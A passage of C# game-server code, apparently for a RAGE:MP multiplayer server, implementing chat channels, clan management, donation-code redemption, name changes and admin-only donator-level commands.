                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Clan clan = await context.Clans.AsQueryable().FirstOrDefaultAsync(c => c.SQL_ID == acc.ClanID);
                    if (clan == null)
                    {
                        NAPI.Task.Run(() =>
                        {
                            EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}A clan with that ID was not found!");
                        });
                        return;
                    }
                    int membersCount = await context.Accounts.AsQueryable().CountAsync(a => a.ClanID == clan.SQL_ID);
                    NAPI.Task.Run(() =>
                    {
                        EPlayer.SendMessage(player, $"~y~====================> STATISTICS FOR: ~w~{clan.Name} ~y~<====================");
                        EPlayer.SendMessage(player, $"~g~WEEKLY KILLS: ~w~{clan.WeekKills}");
                        EPlayer.SendMessage(player, $"~o~TOTAL KILLS: ~w~{clan.TotalKills}");
                        EPlayer.SendMessage(player, $"~p~MEMBERS: ~w~{membersCount}");
                        EPlayer.SendMessage(player, " ");
                    });

                }
            });
            return;
        }

        [Command("leaveclan")]
        public void cmd_leaveclan(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            Account acc = EPlayer.GetAccount(player);
            if (acc.ClanID == -1 || acc.ClanTier == -1)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}You are not part of a clan!");
                return;
            }

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    if (acc.ClanTier == 0)
                    {
                        Clan clan = await context.Clans.AsQueryable().FirstOrDefaultAsync(c => c.SQL_ID == acc.ClanID);
                        if (clan != null)
                        {
                            context.Clans.Remove(clan);
                        }
                        NAPI.Task.Run(() =>
                        {
                            EPlayer.SendMessage(player, "~r~[CLAN DISBANDED]~w~ You left the clan you were owner of and therefore it has been disbanded & deleted!");

                        });
                    }
                    acc.ClanID = -1;
                    acc.ClanTier = -1;

                    await context.SaveChangesAsync();
                    NAPI.Task.Run(() =>
                    {
                        EPlayer.SendMessage(player, "~r~[CLAN LEAVE] ~w~You successfully left the clan.");
                    });
                }
            });
            

            return;
        }

        [Command("createclan", "!{#AFAFAF}[USAGE] createclan (clan name)", GreedyArg = true)]
        public void cmd_createclan(Player player, string clanname)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            Account acc = EPlayer.GetAccount(player);
            if(acc.ClanID != -1 || acc.ClanTier != -1)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}You are already in a clan! Please leave your current one first (Menu [M] > Clan > Leave).");
                return;
            }
            if(acc.Points < 300)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}You need ~y~300 Points~w~ to create a clan!");
                return;
            }
            if(clanname.Length > 32 || clanname.Length < 3)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}Clan name must be between 3 and 32 characters!");
                return;
            }
            string nameCheck = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890 ";
            bool isNameGood = true;
            for(int i = 0; i < clanname.Length; i++)
            {
                if (!nameCheck.Contains(clanname[i])) { isNameGood = false; break; }
            }
            if (!isNameGood)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}Clan name must be alphanumeric (A-Z, 0-9)!");
                return;
            }

            /*
             * For testing purposes I am creating a clan this way.
             * In real scenario there will be a UI with a confirmation window or something along those lines.
             * Also a warning that a weekly/monthly clan fee will be paid.
             */
            EPlayer.SendMessage(player, "~y~Creating clan...");
            Clan clan = new Clan()
            {
                Name = clanname,
                WeekKills = 0,
                TotalKills = 0,
                WeekWins = 0
            };
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    await context.Clans.AddAsync(clan);
                    await context.SaveChangesAsync();
                    Clan thaClan = await context.Clans.AsQueryable().FirstOrDefaultAsync(c => c.Name == clanname);

                    acc.ClanTier = 0;
                    acc.ClanID = thaClan.SQL_ID;
                    EPlayer.Save(player, false);

                    NAPI.Task.Run(() =>
                    {
                        EPlayer.SendMessage(player, $"~g~[CLAN] ~w~Congratulations! You've successfully created a clan named ~y~{clanname}~w~ for 300 Points!");
                        EPlayer.SendMessage(player, $"~g~[CLAN] ~w~You can manage your clan through the clan panel (Menu [M] > Clan > Manage)");
                        EPlayer.SendMessage(player, $"~g~[CLAN] ~w~If you have any questions, ask the staff team or management.");
                        EPlayer.SendMessage(player, $"~g~[CLAN] ~r~NOTICE: ~w~If you leave your clan, it will automatically be disbanded and deleted.");
                        EPlayer.SendMessage(player, $"~g~[CLAN] ~w~Best of luck!");
                    });
                }
            });


            return;
        }

        [Command("redeem", "!{#AFAFAF}[USAGE] redeem (code)")]
        public void cmd_redeem(Player player, string code)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    RedeemableCode redeem = await context.RedeemableCodes.AsQueryable().FirstOrDefaultAsync(r => r.Code.Equals(code, StringComparison.OrdinalIgnoreCase));

                    if (redeem == null)
                    {
                        NAPI.Task.Run(() =>
                        {
                            EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}This code is invalid! Please ensure you are entering it correctly.");
                            EPlayer.SendMessage(player, "!{#C9C9C9}[HINT] A common mistake made is mixing up the letter 'O' and the number zero (0).");
                        });
                        return;
                    }
                    if (redeem.Uses <= 0)
                    {
                        NAPI.Task.Run(() =>
                        {
                            EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}This code has been used already! Please ask the management for a new one if you donated and received this one.");
                        });
                        context.RedeemableCodes.Remove(redeem);
                        await context.SaveChangesAsync();
                        return;
                    }

                    /* ---Donation Types/Values---
                     * 0 => Bronze [VALUE: how many times it can be redeemed]
                     * 1 => Silver
                     * 2 => Gold
                     * 3 => 100 Donator Points
                     * 4 => Namechange
                     * 5 => 5 namechanges [bundle]
                     */
                    Account acc = EPlayer.GetAccount(player);
                    switch (redeem.Value)
                    {
                        case 0:
                            acc.DonatorPoints += 200;
                            acc.DonatorLevel = 1;
                            NAPI.Task.Run(() =>
                            {
                                EPlayer.SendMessage(player, $"!{{#ffe291}}[REDEEM] ~w~Congratulations! You've successfully redeemed {EPlayer.GetDonatorLevelName(1, true)}~w~!");
                            });
                            break;
                        case 1:
                            acc.DonatorPoints += 350;
                            acc.DonatorLevel = 2;
                            NAPI.Task.Run(() =>
                            {
                                EPlayer.SendMessage(player, $"!{{#ffe291}}[REDEEM] ~w~Congratulations! You've successfully redeemed {EPlayer.GetDonatorLevelName(2, true)}~w~!");
                            });
                            break;
                        case 2:
                            acc.DonatorPoints += 500;
                            acc.DonatorLevel = 3;
                            NAPI.Task.Run(() =>
                            {
                                EPlayer.SendMessage(player, $"!{{#ffe291}}[REDEEM] ~w~Congratulations! You've successfully redeemed {EPlayer.GetDonatorLevelName(3, true)}~w~!");
                            });
                            break;
                        case 3:
                            acc.DonatorPoints += 100;
                            NAPI.Task.Run(() =>
                            {
                                EPlayer.SendMessage(player, $"!{{#ffe291}}[REDEEM] ~w~Congratulations! You've successfully redeemed !{{#a8ffb7}}100 Donator Points~w~!");
                            });
                            break;
                        case 4:
                            acc.Namechanges++;
                            NAPI.Task.Run(() =>
                            {
                                EPlayer.SendMessage(player, $"!{{#ffe291}}[REDEEM] ~w~Congratulations! You've successfully redeemed !{{#a8ffb7}}1 Namechange~w~!");
                            });
                            break;
                        case 5:
                            acc.Namechanges += 5;
                            NAPI.Task.Run(() =>
                            {
                                EPlayer.SendMessage(player, $"!{{#ffe291}}[REDEEM] ~w~Congratulations! You've successfully redeemed !{{#a8ffb7}}5 Namechanges Bundle~w~!");
                            });
                            break;
                    }
                    NAPI.Task.Run(() =>
                    {
                        EPlayer.SendMessage(player, "~w~Thank you very much for donating! ~r~<3 ~w~-RnC Management");
                    });

                    context.RedeemableCodes.Remove(redeem);
                    await context.SaveChangesAsync();
                }
            });
            
            return;
        }
        /*
        [Command("forcelogin")]
        public void cmd_forcelogin(Player player, string username)
        {
            Account acc = ContextFactory.Instance.Accounts.FirstOrDefault(a => a.Username == username);

            Events.OnPlayerLogin(player, acc);
        }
        */
        [Command("namechange", "!{#AFAFAF}[USAGE] namechange (new name)")]
        public void cmd_namechange(Player player, string newname)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Namechanges <= 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You don't have any namechanges!");
                return;
            }

            string name = player.Name;
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    if (await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(newname, StringComparison.OrdinalIgnoreCase) == true) != null)
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's already an account with that name!");
                        });
                        return;
                    }

                    /*foreach (var arena in ContextFactory.Instance.CustomArenas.ToList().Where(a => a.Creator.Equals(name, StringComparison.OrdinalIgnoreCase)))
                    {
                        arena.Creator = newname;
                    }*/
                    foreach (var arena in await context.Bans.AsQueryable().Where(a => a.Admin.Equals(name, StringComparison.OrdinalIgnoreCase)).ToListAsync())
                    {
                        arena.Admin = newname;
                    }

                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347} Reconnect with your new name: !{#FFFFFF}" + newname);
                        EPlayer.Notify(player, $"Please reconnect with your new name: {newname}", "green", "fas fa-check", false, 3000, "center", "replace");
                        player.Name = newname;
                        player.ResetData("AccountHandle");
                        player.ResetData("LoggedIn");
                    });

                    EPlayer.GetAccount(player).Username = newname;
                    EPlayer.GetAccount(player).Namechanges--;
                    EPlayer.Save(player);
                    NAPI.Task.Run(() => { try { player.KickSilent(); } catch { } }, 1000);
                }
            });            
            return;
        }

        [Command("setdonator", "!{#AFAFAF}[USAGE] setdonator (target) (level)", Alias = "makedonator")]
        public void cmd_setdonator(Player player, Player target, int level)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 5)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }


            Account t_acc = target.GetData<Account>("AccountHandle");

            if (level < 0 || level > 3)
            { // Bronze, Silver, Gold
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot preceed level 0 or exceed 3.");
                return;
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:setdonator:{target.Name}:{level}"); } catch { }
            Logs.LogAdmin(player, $"Set {target.Name}'s donator level to {EPlayer.GetDonatorLevelName(level)}.");
            t_acc.DonatorLevel = level;
            player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}You have set {target.Name}'s donator level to {EPlayer.GetDonatorLevelName(level, true)} ({level})");
            target.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}{player.Name} has set your donator level to {EPlayer.GetDonatorLevelName(level, true)} ({level})");
            EPlayer.Save(target);
        }

        [Command("osetdonator", "!{#AFAFAF}[USAGE] osetdonator (target) (level)")]
        public void cmd_osetdonator(Player player, string name, int level)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 5)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (RAGE.Entities.Players.All.Where(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase)).Count() > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is currently in-game! Use /givedonorpoints!");
                return;
            }

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);

                    if ((tpAcc != null) == false)
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name.");
                        });
                         return;
                    }

                    if (level < 0 || level > 3)
                    { // Bronze, Silver, Gold
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot preceed level 0 or exceed 3.");
                        });
                        return;
                    }

                    // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:osetdonator:{tpAcc.Username}:{level}"); } catch { }
                    Logs.LogAdmin(player, $"Set offline player {tpAcc.Username}'s donator level to {EPlayer.GetDonatorLevelName(level)}.");
                    tpAcc.DonatorLevel = level;
                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}You have set {tpAcc.Username}'s donator level to {EPlayer.GetDonatorLevelName(level, true)} ({level})");
                    });

                    await context.SaveChangesAsync();
                }
            });
            
            return;
        }

        [Command("dc", "!{#AFAFAF}[USAGE] donatorchat (text)", Alias = "donatorchat", GreedyArg = true)]
        public void cmd_donatorchat(Player player, string text)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).DonatorLevel < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            foreach (Player p in Settings.LoggedInPlayers)
            {
                if(EPlayer.GetAccount(p).DonatorLevel > 0) p.TriggerEvent("pushMsgToChat", $"!{{#F7EB05}}[{EPlayer.GetDonatorLevelName(EPlayer.GetAccount(player).DonatorLevel, true)}!{{#F7EB05}}] {player.Name}: {text}");
            }
            return;
        }

        [Command("id", "!{#AFAFAF}[USAGE] id (Id/PartOfName)", GreedyArg = true)]
        public void cmd_id(Player player, string name)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[>] !{#FFFFFF}Player Query Result:");

            List<Player> predicate = new List<Player>();

            int id = 0;
            if (Int32.TryParse(name, out id))
            {
                try { if (RAGE.Entities.Players.GetAt((ushort)id) != null) predicate.Add(RAGE.Entities.Players.GetAt((ushort)id)); } catch { }
            }

            RAGE.Entities.Players.All.ForEach((Player p) =>
            {
                if(p.Name.Contains(name, StringComparison.OrdinalIgnoreCase))
                {
                    if(!predicate.Contains(p)) predicate.Add(p);
                }
            });

            predicate.ForEach((p) =>
            {
                string lobby = "!{#ffffff}[Lobby " + p.GetSharedData<int>("InLobby") + (p.GetSharedData<int>("InDM") > -1 ? (" DM " + p.GetSharedData<int>("InDM")) : "")  + "]";
                switch (p.GetSharedData<int>("InLobby"))
                {
                    case -1:
                        lobby = "!{#FF6347}[Login]";
                        break;
                    case -2:
                        lobby = "!{#a88008}[Jail]";
                        break;
                    case -3:
                        lobby = "!{#66e8d9}[Freeroam]";
                        break;
                    case -4:
                        lobby = "!{#fabf3e}[Derby]";
                        break;
                    case -5:
                        lobby = "!{#FF6347}[Customizer]";
                        break;
                    case -6:
                        lobby = "!{#FF0000}[Deathmatch]";
                        break;
                }
                
                p.SetSharedData("Ping", p.Ping);

                player.TriggerEvent("pushMsgToChat", $"!{{#C4C4C4}}{p.Name} (ID: {p.Id}) (Ping: {p.GetSharedData<int>("Ping")}ms) {lobby} {(EPlayer.IsAFK(p) ? "!{#FF0000}(AFK)" : "")}");
            });

            return;
        }

        [Command("afk", GreedyArg = true)]
        public void cmd_afk(Player pl)
        {
            cmd_autojoin(pl);
            pl.TriggerEvent("pushMsgToChat", "!{#FF6347}>> If you wish to go AFK, use /autojoin to toggle it to OFF. To avoid being put in a copchase!");
        }

        [Command("adminchat", "!{#AFAFAF}[USAGE] adminchat (text)", Alias = "a", GreedyArg = true)]
        public void cmd_adminchat(Player player, string text)
        {
            player.SetData("TUA_LT", 0);

            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[A] {player.Name}:  {text}");
        }

        [Command("looc", "!{#AFAFAF}[USAGE] looc (text)", Alias = "b", GreedyArg = true)]
        public void cmd_b(Player player, string text)
        {
            player.SetData("TUA_LT", 0);

            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
                return;
            }

            string chatStr = $"(( (LOCAL OOC) {player.Name.Replace("_", " ")}: {text} ))";
            foreach (Player i in RAGE.Entities.Players.All)
            {
                if (i.Dimension == player.Dimension)
                {
                    if (i.Position.DistanceTo(player.Position) <= 10.0) i.TriggerEvent("pushMsgToChat", $"!{{#D4D4D4}}{chatStr}");
                    if (i.Position.DistanceTo(player.Position) > 10.0 && i.Position.DistanceTo(player.Position) <= 20.0) i.TriggerEvent("pushMsgToChat", $"!{{#B5B5B5}}{chatStr}");
                    if (i.Position.DistanceTo(player.Position) > 20.0 && i.Position.DistanceTo(player.Position) <= 40.0) i.TriggerEvent("pushMsgToChat", $"!{{#999999}}{chatStr}");
                }
            }
        }

        [Command("low", "!{#AFAFAF}[USAGE] low (text)", Alias = "l", GreedyArg = true)]
        public void cmd_low(Player player, string text)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
                return;
            }

            string chatStr = $"[LOW] {player.Name.Replace("_", " ")} says: {text}";
            foreach (Player i in Settings.LoggedInPlayers)
            {
                if (i.Dimension == player.Dimension)
                {
                    if (i.Position.DistanceTo(player.Position) <= 5.0) i.TriggerEvent("pushMsgToChat", $"!{{#999999}}{chatStr}");
                }
            }
        }

        [Command("cw", "!{#AFAFAF}[USAGE] carwhisper (text)", Alias = "carwhisper", GreedyArg = true)]
        public void cmd_cw(Player player, string text)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!player.IsInVehicle)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in any vehicle.");
                return;
            }

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
                return;
            }

            string chatStr = $"[CAR] {player.Name.Replace("_", " ")} says: {text}";
            foreach (Player i in Settings.LoggedInPlayers.Where(a => a.IsInVehicle && a.Vehicle == player.Vehicle))
            {
                i.TriggerEvent("pushMsgToChat", $"!{{#FFFF00}}{chatStr}");
            }
            return;
        }

        [Command("s", "!{#AFAFAF}[USAGE] shout (text)", Alias = "shout", GreedyArg = true)]
        public void cmd_shout(Player player, string text)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
                return;
            }

            string chatStr = $"{player.Name.Replace("_", " ")} shouts: {text}";
            foreach (Player i in RAGE.Entities.Players.All)
            {
                if (i.Dimension == player.Dimension)
                {
                    if (i.Position.DistanceTo(player.Position) <= 20.0) i.TriggerEvent("pushMsgToChat", $"!{{#D4D4D4}}{chatStr}");
                    if (i.Position.DistanceTo(player.Position) > 20.0 && i.Position.DistanceTo(player.Position) <= 30.0) i.TriggerEvent("pushMsgToChat", $"!{{#B5B5B5}}{chatStr}");
                    if (i.Position.DistanceTo(player.Position) > 30.0 && i.Position.DistanceTo(player.Position) <= 50.0) i.TriggerEvent("pushMsgToChat", $"!{{#999999}}{chatStr}");
                }
            }
            return;
        }

        [Command("m", "!{#AFAFAF}[USAGE] megaphone (text)", Alias = "megaphone", GreedyArg = true)]
        public void cmd_m(Player player, string text)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
                return;
            }

            bool isInCopchase = false;
            LobbyData lobby = Settings.Lobbies.Find(lobby => lobby.lobbyId == player.GetSharedData<int>("InLobby"));
            if (lobby != null)
            {
                if (lobby.Cops.Contains(player) && lobby.gameStatus == 1)
                {
                    isInCopchase = true;
                }
            }

            if (!isInCopchase) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in the copchase as a cop."); return; }

            if(!player.IsInVehicle || (!player.Vehicle.HasSharedData("Team") || player.Vehicle.GetSharedData<int>("Team") != 1))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in a cop vehicle.");
                return;
            }

           string chatStr = $"!{{#FFFF00}}** [MEGAPHONE] {player.Name.Replace("_", " ")}: {text}";

            foreach (Player i in RAGE.Entities.Players.All.Where(a => a.Dimension == player.Dimension 
                && a.Position.DistanceTo(player.Position) < 150.0))
            {
                i.TriggerEvent("pushMsgToChat", chatStr);
            }
            return;
        }

        [Command("r", "!{#AFAFAF}[USAGE] radio (text)", Alias = "wt,walkietalkie,radio", GreedyArg = true)]
        public static void cmd_r(Player player, string text)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
                return;
            }

            bool isInCopchase = false;
            LobbyData lobby = Settings.Lobbies.Find(lobby => lobby.lobbyId == player.GetSharedData<int>("InLobby"));
            if (lobby != null)
            {
                if ((lobby.Cops.Contains(player) || lobby.Fugitives.Contains(player)) && lobby.gameStatus == 1)
                {
                    isInCopchase = true;
                }
            }

            if(!isInCopchase) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in the copchase."); return; }

            if (lobby.Cops.Contains(player))
            {
                string chatStr = $"!{{#FFEC8B}}** [RADIO | FREQ: 911] {player.Name.Replace("_", " ")}: {text}";

                foreach (Player i in lobby.Cops)
                {
                    i.TriggerEvent("pushMsgToChat", chatStr);
                }
            }
            else if (lobby.Fugitives.Contains(player))
            {
                string chatStr = $"!{{#FFEC8B}}** [WT | FREQ: {lobby.lobbyId + 8346}] {player.Name.Replace("_", " ")}: {text}";

                foreach (Player i in lobby.Fugitives)
                {
                    i.TriggerEvent("pushMsgToChat", chatStr);
                }
            }
            return;
        }

        [Command("admins", Alias = "staff")]
        public void cmd_admins(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if(EPlayer.GetAccount(player).Admin < 1)
            {
                EPlayer.SendMessageToAllAdmins("!{#FF6347}[AdmWarn] " + player.Name + " used /admins.");
            }

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}Online Staff:");
            int count = 0;
            foreach (Player adm in Settings.LoggedInPlayers.Where(b => EPlayer.LoggedIn(b) == true && EPlayer.GetAccount(b).Admin > 0))
            {
                if (EPlayer.GetAccount(player).Admin < 3 && adm.GetData<bool>("Anonymous") == false)
                {
                    player.TriggerEvent("pushMsgToChat", $"{EPlayer.GetAdminLevelName(EPlayer.GetAccount(adm).Admin, true)}: !{{#FFFFFF}}{adm.Name}");
                    count++;
                }
            }
                
            if(count == 0) {
                player.TriggerEvent("pushMsgToChat", "!{#FF0000}No admins are online currently but don't do dumb moves, admins are always watching from discord.");
            }
            return;
        }

        [Command("ooc", "!{#AFAFAF}[USAGE] ooc (text)", Alias = "o", GreedyArg = true)]
        public static void cmd_ooc(Player player, string text)
        {
            player.SetData("TUA_LT", 0);

            if (!EPlayer.LoggedIn(player))
                return;

            if(Settings.OOC != true)
            {
                if (EPlayer.GetAccount(player).Admin < 1)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}OOC is turned off.");
                    return;
                }
                else player.SendNotification("~r~OOC chat is disabled (friendly reminder)");
            }

            if(player.GetData<bool>("OOCState") == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have currently disabled OOC chat! Re-enable it with /tog ooc to send and receive messages.");
                return;
            }

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
                return;
            }

            if(RAGE.Entities.Players.All.Count > 20)
            {
                if(player.HasData("LastOOCTick"))
                {
                    if (Environment.TickCount64 - player.GetData<long>("LastOOCTick") < 5000 && EPlayer.GetAccount(player).Admin < 1)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}OOC slowmode is on! Wait a bit or use /lg or /lo");
                        return;
                    }
                }

                player.SetData("LastOOCTick", Environment.TickCount64);
            }

            if (EPlayer.GetAccount(player).Admin < 1 || (EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true))
            {
                if (EPlayer.GetAccount(player).DonatorLevel < 1)
                {
                    RAGE.Entities.Players.All.ForEach(pl =>
                    {
                        if (EPlayer.LoggedIn(pl))
                        {
                            if (pl.GetData<bool>("OOCState") == true) 
                                pl.TriggerEvent("pushMsgToChat", $"(( [OOC] {player.Name}: {text} ))");
                        }
                    });
                }
                else
                {
                    Settings.LoggedInPlayers.ForEach(pl =>
                    {
                        if (pl.GetData<bool>("OOCState") == true) 
                            pl.TriggerEvent("pushMsgToChat", $"(( [OOC] {EPlayer.GetDonatorLevelName(EPlayer.GetAccount(player).DonatorLevel, true)}!{{#FFFFFF}} {player.Name}: {text} ))");
                    });
                }
            }
            else
            {
                Settings.LoggedInPlayers.ForEach(pl =>
                {
                    if (pl.GetData<bool>("OOCState") == true)
                        pl.TriggerEvent("pushMsgToChat", $"(( [OOC] {EPlayer.GetAdminLevelName(EPlayer.GetAccount(player).Admin, true)}!{{#FFFFFF}} {player.Name}: {text} ))");
                });
            }

            if(text.Contains("weather", StringComparison.OrdinalIgnoreCase) && player.GetSharedData<int>("PlayerWeather") == -1)
            {
                player.TriggerEvent("pushMsgToChat", "~y~[TIP] ~w~Set a custom weather in the ~y~Menu~w~ if the current one is annoying you.");
            }

            Discord.SendTextChannel("staff-bot", $"**(OOC) | {player.Name}**: {text}");
        }


        [Command("lobbychat", "!{#AFAFAF}[USAGE] lobbychat (text)", Alias = "lg,lo", GreedyArg = true)]
        public void cmd_lobbychat(Player player, string text)
        {
            player.SetData("TUA_LT", 0);

            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
                return;
            }

            if (EPlayer.GetAccount(player).Admin < 1 || (EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true))
            {
                if (EPlayer.GetAccount(player).DonatorLevel < 1)
                {
                    foreach (Player pl in Settings.LoggedInPlayers.Where(a => a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby")))
                    {
                        pl.TriggerEvent("pushMsgToChat", $"(( [LOBBY] {player.Name}: {text} ))");
                    }
                }
                else
                {
                    foreach (Player pl in Settings.LoggedInPlayers.Where(a => a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby")))
                    {
                        pl.TriggerEvent("pushMsgToChat", $"(( [LOBBY] {EPlayer.GetDonatorLevelName(EPlayer.GetAccount(player).DonatorLevel, true)}!{{#FFFFFF}} {player.Name}: {text} ))");
                    }
                }
            }
            else
            {
                foreach (Player pl in Settings.LoggedInPlayers.Where(a => a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby")))
                {
                    pl.TriggerEvent("pushMsgToChat", $"(( [LOBBY] {EPlayer.GetAdminLevelName(EPlayer.GetAccount(player).Admin, true)}!{{#FFFFFF}} {player.Name}: {text} ))");
                }
            }

            Discord.SendTextChannel("staff-bot", $"**(Lobby {player.GetSharedData<int>("InLobby")}) | {player.Name}**: {text}");
        }

        [Command("ann", "!{#AFAFAF}[USAGE] ann (text)", Alias = "announce", GreedyArg = true)]
        public void cmd_ann(Player player, string text)
        {
            player.SetData("TUA_LT", 0);

            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not allowed to use this command!");
                return;
            }


            EPlayer.SendMessageToAll("!{#FF6347}=======================================");
            EPlayer.SendMessageToAll($"(( {EPlayer.GetAdminLevelName(EPlayer.GetAccount(player).Admin, true)}!{{#FFFFFF}} {player.Name}: ))");
            EPlayer.SendMessageToAll("(( " + text + "!{#FFFFFF} ))");

            Discord.SendTextChannel("staff-bot", $"**(ANNOUNCEMENT) | {player.Name}**: {text}");
        }

        [Command("anonymous", Alias = "vanish")]
        public void cmd_anonymous(Player player)
        {
